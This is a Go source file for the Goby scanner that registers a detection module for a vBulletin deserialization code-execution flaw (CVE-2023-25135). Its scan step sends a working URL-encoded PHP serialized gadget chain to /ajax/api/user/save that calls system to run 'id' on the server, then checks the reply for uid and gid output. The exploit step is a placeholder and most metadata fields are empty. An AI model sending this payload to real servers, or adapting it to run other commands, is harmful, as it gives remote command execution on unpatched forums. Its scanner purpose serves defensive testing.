package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
  "Name": "vBulletin反序列化代码执行漏洞 CVE-2023-25135",
  "Description": "",
  "Product": "",
  "Homepage": "",
  "DisclosureDate": null,
  "Author": "清晨",
  "FofaQuery": "app=\"vBulletin\" || product=\"vBulletin\"",
  "GobyQuery": "app=\"vBulletin\" || product=\"vBulletin\"",
  "Level": "3",
  "Impact": "",
  "Recommendation": "",
  "References": [],
  "Is0day": false,
  "HasExp": false,
  "ExpParams": [],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "method": "POST",
        "uri": "/ajax/api/user/save",
        "follow_redirect": false,
        "header": {
          "Content-Type": "application/x-www-form-urlencoded"
        },
        "data_type": "text",
        "data": "adminoptions=&options=&password=password&securitytoken=guest&user%5Bemail%5D=pown%40pown.net&user%5Bpassword%5D=password&user%5Bsearchprefs%5D=a%3A2%3A%7Bi%3A0%3BO%3A27%3A%22googlelogin_vendor_autoload%22%3A0%3A%7B%7Di%3A1%3BO%3A32%3A%22Monolog%5CHandler%5CSyslogUdpHandler%22%3A1%3A%7Bs%3A9%3A%22%00%2A%00socket%22%3BO%3A29%3A%22Monolog%5CHandler%5CBufferHandler%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3Br%3A4%3Bs%3A13%3A%22%00%2A%00bufferSize%22%3Bi%3A-1%3Bs%3A9%3A%22%00%2A%00buffer%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3Bs%3A36%3A%22echo+RwIMGG4H%3A%3A%3B+id%3B+echo+%3A%3ARwIMGG4H%22%3Bs%3A5%3A%22level%22%3BN%3B%7D%7Ds%3A8%3A%22%00%2A%00level%22%3BN%3Bs%3A14%3A%22%00%2A%00initialized%22%3Bb%3A1%3Bs%3A14%3A%22%00%2A%00bufferLimit%22%3Bi%3A-1%3Bs%3A13%3A%22%00%2A%00processors%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A7%3A%22current%22%3Bi%3A1%3Bs%3A6%3A%22system%22%3B%7D%7D%7D%7D&user%5Busername%5D=toto&userfield=&userid=0"
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "uid=",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "gid=",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/test.php",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "test",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "Tags": [],
  "VulType": [],
  "CVEIDs": [
    ""
  ],
  "CNNVD": [
    ""
  ],
  "CNVD": [
    ""
  ],
  "CVSSScore": "",
  "Translation": {
    "CN": {
      "Name": "vBulletin反序列化代码执行漏洞 CVE-2023-25135",
      "Product": "",
      "Description": "",
      "Recommendation": "",
      "Impact": "",
      "VulType": [],
      "Tags": []
    },
    "EN": {
      "Name": "VBulletin Deserialization Code Execution CVE-2023-25135",
      "Product": "",
      "Description": "",
      "Recommendation": "",
      "Impact": "",
      "VulType": [],
      "Tags": []
    }
  },
  "AttackSurfaces": {
    "Application": null,
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}